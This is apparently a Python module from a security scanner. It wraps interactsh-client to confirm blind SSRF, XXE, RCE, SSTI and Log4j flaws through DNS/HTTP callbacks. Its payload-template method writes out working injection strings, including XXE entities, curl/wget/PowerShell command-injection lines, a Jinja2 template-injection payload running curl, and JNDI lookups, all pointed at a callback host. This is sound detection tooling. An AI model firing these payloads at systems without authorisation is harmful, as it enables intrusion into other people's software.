"""
Interactsh OOB Integration

Out-of-band callback server integration for blind vulnerability verification.
Uses interactsh-client (pre-installed in sandbox) for DNS/HTTP callbacks.
"""

import asyncio
import json
import logging
import re
import time
import uuid
from dataclasses import dataclass, field
from datetime import UTC, datetime
from typing import Any, Callable, Awaitable

logger = logging.getLogger(__name__)


@dataclass
class OOBInteraction:
    """Record of an out-of-band interaction."""
    
    interaction_id: str
    protocol: str  # dns, http, smtp, ldap
    timestamp: datetime
    remote_address: str
    raw_data: dict[str, Any] = field(default_factory=dict)
    
    # Context linking
    vulnerability_id: str | None = None
    payload_id: str | None = None
    
    def to_dict(self) -> dict[str, Any]:
        return {
            "interaction_id": self.interaction_id,
            "protocol": self.protocol,
            "timestamp": self.timestamp.isoformat(),
            "remote_address": self.remote_address,
            "vulnerability_id": self.vulnerability_id,
            "payload_id": self.payload_id,
        }


@dataclass
class OOBPayload:
    """A tracked OOB payload."""
    
    payload_id: str
    subdomain: str  # Unique subdomain for this payload
    full_url: str   # Full callback URL
    vulnerability_id: str
    vulnerability_class: str
    created_at: datetime = field(default_factory=lambda: datetime.now(UTC))
    expires_at: datetime | None = None
    triggered: bool = False
    interactions: list[OOBInteraction] = field(default_factory=list)


class InteractshClient:
    """
    Wrapper for interactsh-client.
    
    Manages OOB payloads and polls for interactions to verify blind vulnerabilities.
    """
    
    def __init__(
        self,
        terminal_execute_fn: Callable[..., Awaitable[dict[str, Any]]] | None = None,
        poll_interval: float = 2.0,
        server: str | None = None,
    ):
        """
        Initialize Interactsh client.
        
        Args:
            terminal_execute_fn: Async function to execute commands in sandbox
            poll_interval: Seconds between polling for interactions
            server: Custom interactsh server (default: oast.pro)
        """
        self.terminal_execute = terminal_execute_fn
        self.poll_interval = poll_interval
        self.server = server or "oast.pro"
        
        self._session_id: str | None = None
        self._base_domain: str | None = None
        self._payloads: dict[str, OOBPayload] = {}
        self._interactions: list[OOBInteraction] = []
        self._polling: bool = False
        self._poll_task: asyncio.Task | None = None
    
    async def start_session(self) -> str:
        """
        Start interactsh session and get base domain.
        
        Returns the base domain for generating payloads.
        """
        if self._base_domain:
            return self._base_domain
        
        if not self.terminal_execute:
            # Mock mode for testing
            self._session_id = str(uuid.uuid4())[:8]
            self._base_domain = f"{self._session_id}.oast.pro"
            logger.info(f"Mock Interactsh session: {self._base_domain}")
            return self._base_domain
        
        # Start interactsh-client and capture domain
        cmd = f"interactsh-client -server {self.server} -json -poll-interval 1 -n 1"
        
        try:
            result = await self.terminal_execute(cmd, timeout=15)
            output = result.get("output", "")
            
            # Parse domain from output
            # Format: [INF] Using Interactsh Server: oast.pro
            # [INF] x1y2z3.oast.pro
            domain_match = re.search(r"\[INF\]\s+([a-z0-9]+\.[a-z0-9.-]+)", output)
            if domain_match:
                self._base_domain = domain_match.group(1)
                self._session_id = self._base_domain.split(".")[0]
                logger.info(f"Interactsh session started: {self._base_domain}")
            else:
                # Fallback to mock
                self._session_id = str(uuid.uuid4())[:8]
                self._base_domain = f"{self._session_id}.oast.pro"
                logger.warning(f"Could not parse interactsh output, using mock: {self._base_domain}")
            
        except Exception as e:
            logger.error(f"Failed to start interactsh: {e}")
            # Fallback to mock
            self._session_id = str(uuid.uuid4())[:8]
            self._base_domain = f"{self._session_id}.oast.pro"
        
        return self._base_domain
    
    async def generate_payload(
        self,
        vulnerability_id: str,
        vulnerability_class: str,
        payload_type: str = "dns",
    ) -> OOBPayload:
        """
        Generate a unique OOB payload for a vulnerability.
        
        Args:
            vulnerability_id: ID of vulnerability being tested
            vulnerability_class: Type of vuln (ssrf, xxe, rce, etc.)
            payload_type: dns, http, or both
            
        Returns:
            OOBPayload with unique subdomain for tracking
        """
        if not self._base_domain:
            await self.start_session()
        
        # Generate unique subdomain for this payload
        payload_id = str(uuid.uuid4())[:8]
        subdomain = f"{payload_id}.{self._base_domain}"
        
        payload = OOBPayload(
            payload_id=payload_id,
            subdomain=subdomain,
            full_url=f"http://{subdomain}",
            vulnerability_id=vulnerability_id,
            vulnerability_class=vulnerability_class,
        )
        
        self._payloads[payload_id] = payload
        logger.debug(f"Generated OOB payload: {subdomain} for {vulnerability_id}")
        
        return payload
    
    def get_payloads_for_class(self, vuln_class: str) -> dict[str, str]:
        """
        Get payload templates for a vulnerability class.
        
        Returns dict of payload_name -> payload_template
        """
        if not self._base_domain:
            base = "INTERACTSH_URL"
        else:
            base = f"http://{str(uuid.uuid4())[:8]}.{self._base_domain}"
        
        payloads: dict[str, dict[str, str]] = {
            "ssrf": {
                "basic_http": base,
                "url_encoded": base.replace("://", "%3A%2F%2F").replace("/", "%2F"),
                "dns_only": base.replace("http://", "").split(".")[0] + f".{self._base_domain}",
            },
            "xxe": {
                "external_dtd": f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{base}/xxe">]>',
                "parameter_entity": f'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{base}/xxe">%xxe;]>',
            },
            "rce": {
                "curl": f"curl {base}/rce",
                "wget": f"wget {base}/rce",
                "nslookup": f"nslookup {base.replace('http://', '')}",
                "powershell": f"powershell -c \"Invoke-WebRequest -Uri {base}/rce\"",
            },
            "ssti": {
                "jinja2": "{{request.application.__globals__.__builtins__.__import__('os').popen('curl " + base + "/ssti').read()}}",
            },
            "log4j": {
                "jndi_ldap": f"${{jndi:ldap://{base.replace('http://', '')}/a}}",
                "jndi_dns": f"${{jndi:dns://{base.replace('http://', '')}}}",
            },
        }
        
        return payloads.get(vuln_class.lower(), {"generic": base})
    
    async def poll_interactions(self) -> list[OOBInteraction]:
        """
        Poll for new interactions.
        
        Returns list of new interactions since last poll.
        """
        new_interactions: list[OOBInteraction] = []
        
        if not self.terminal_execute:
            # Mock mode - no interactions
            return new_interactions
        
        try:
            # Poll interactsh for interactions
            cmd = f"interactsh-client -server {self.server} -json -poll-interval 1 -n 1"
            result = await self.terminal_execute(cmd, timeout=10)
            output = result.get("output", "")
            
            # Parse JSON interactions
            for line in output.splitlines():
                line = line.strip()
                if line.startswith("{"):
                    try:
                        data = json.loads(line)
                        
                        # Extract interaction details
                        interaction = OOBInteraction(
                            interaction_id=data.get("unique-id", str(uuid.uuid4())),
                            protocol=data.get("protocol", "unknown"),
                            timestamp=datetime.now(UTC),
                            remote_address=data.get("remote-address", "unknown"),
                            raw_data=data,
                        )
                        
                        # Match to payload
                        subdomain = data.get("full-id", "")
                        payload_id = subdomain.split(".")[0] if subdomain else None
                        
                        if payload_id and payload_id in self._payloads:
                            payload = self._payloads[payload_id]
                            interaction.vulnerability_id = payload.vulnerability_id
                            interaction.payload_id = payload_id
                            payload.triggered = True
                            payload.interactions.append(interaction)
                        
                        new_interactions.append(interaction)
                        self._interactions.append(interaction)
                        
                    except json.JSONDecodeError:
                        continue
                        
        except Exception as e:
            logger.warning(f"Error polling interactsh: {e}")
        
        return new_interactions
    
    async def wait_for_interaction(
        self,
        payload_id: str,
        timeout: float = 30.0,
    ) -> OOBInteraction | None:
        """
        Wait for an interaction on a specific payload.
        
        Args:
            payload_id: ID of payload to wait for
            timeout: Maximum seconds to wait
            
        Returns:
            OOBInteraction if received, None if timeout
        """
        if payload_id not in self._payloads:
            logger.warning(f"Unknown payload ID: {payload_id}")
            return None
        
        payload = self._payloads[payload_id]
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            # Check if already triggered
            if payload.triggered and payload.interactions:
                return payload.interactions[-1]
            
            # Poll for new interactions
            await self.poll_interactions()
            
            # Check again after poll
            if payload.triggered and payload.interactions:
                return payload.interactions[-1]
            
            # Wait before next poll
            await asyncio.sleep(self.poll_interval)
        
        logger.debug(f"Timeout waiting for interaction on {payload_id}")
        return None
    
    async def start_polling(self) -> None:
        """Start background polling for interactions."""
        if self._polling:
            return
        
        self._polling = True
        
        async def poll_loop():
            while self._polling:
                try:
                    await self.poll_interactions()
                except Exception as e:
                    logger.error(f"Polling error: {e}")
                await asyncio.sleep(self.poll_interval)
        
        self._poll_task = asyncio.create_task(poll_loop())
        logger.info("Started interactsh background polling")
    
    async def stop_polling(self) -> None:
        """Stop background polling."""
        self._polling = False
        if self._poll_task:
            self._poll_task.cancel()
            try:
                await self._poll_task
            except asyncio.CancelledError:
                pass
        logger.info("Stopped interactsh polling")
    
    def get_triggered_payloads(self) -> list[OOBPayload]:
        """Get all payloads that received interactions."""
        return [p for p in self._payloads.values() if p.triggered]
    
    def get_payload(self, payload_id: str) -> OOBPayload | None:
        """Get a specific payload."""
        return self._payloads.get(payload_id)
    
    def get_all_interactions(self) -> list[OOBInteraction]:
        """Get all recorded interactions."""
        return self._interactions.copy()
    
    def summary(self) -> dict[str, Any]:
        """Get summary of OOB activity."""
        return {
            "session_id": self._session_id,
            "base_domain": self._base_domain,
            "total_payloads": len(self._payloads),
            "triggered_payloads": len(self.get_triggered_payloads()),
            "total_interactions": len(self._interactions),
            "polling_active": self._polling,
        }


# Convenience functions for verification engine integration

async def create_oob_verifier(
    terminal_execute_fn: Callable[..., Awaitable[dict[str, Any]]] | None = None,
) -> InteractshClient:
    """Create and initialize an OOB verifier."""
    client = InteractshClient(terminal_execute_fn=terminal_execute_fn)
    await client.start_session()
    return client


def get_oob_payload_for_vuln(
    client: InteractshClient,
    vuln_class: str,
    payload_name: str = "basic_http",
) -> str:
    """Get a specific OOB payload template."""
    payloads = client.get_payloads_for_class(vuln_class)
    return payloads.get(payload_name, payloads.get("generic", ""))
